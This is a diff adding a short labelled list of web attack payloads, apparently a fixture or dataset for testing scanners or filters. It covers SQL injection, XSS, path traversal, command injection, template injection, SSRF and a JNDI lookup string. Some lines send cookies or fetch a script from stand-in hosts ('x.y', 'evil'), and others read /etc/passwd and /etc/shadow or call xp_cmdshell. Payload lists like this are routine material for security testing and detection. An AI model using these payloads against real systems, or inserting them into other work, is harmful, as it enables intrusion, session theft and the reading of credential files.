@@ -1,0 +1,30 @@
+sqli	admin'/**/OR/**/1=1#
+sqli	1' ORDER BY 3--
+sqli	' UNION ALL SELECT NULL,NULL--
+sqli	1;SELECT pg_sleep(5)
+sqli	'||(SELECT version())||'
+xss	<img src=x onerror=alert(1)>
+xss	<svg/onload=alert(1)>
+xss	<a href="javascript:alert(1)">x</a>
+xss	'><script>fetch('//x.y/'+document.cookie)</script>
+path_traversal	....//....//etc/passwd
+path_traversal	..%252f..%252fetc%252fpasswd
+path_traversal	%2e%2e%2f%2e%2e%2fetc%2fshadow
+command_injection	; cat /etc/passwd
+command_injection	| whoami
+command_injection	$(id)
+command_injection	`uname -a`
+command_injection	x\nwget http://evil/x.sh
+ssti	{{config.items()}}
+ssti	{{''.__class__.__mro__[1].__subclasses__()}}
+ssti	{% for x in range(9) %}x{% endfor %}
+code_injection	__import__('os').popen('id').read()
+ssrf	http://169.254.169.254/latest/meta-data/
+ssrf	http://localhost:6379/
+ssrf	gopher://127.0.0.1:25/
+code_injection	${jndi:ldap://x.y/a}
+sqli	1' AND 1=CONVERT(int,(SELECT @@version))--
+sqli	'; EXEC xp_cmdshell('dir')--
+command_injection	1 || sleep 5
+command_injection	& ping -n 3 127.0.0.1 &
+sqli	x' AND EXISTS(SELECT 1 FROM users)--
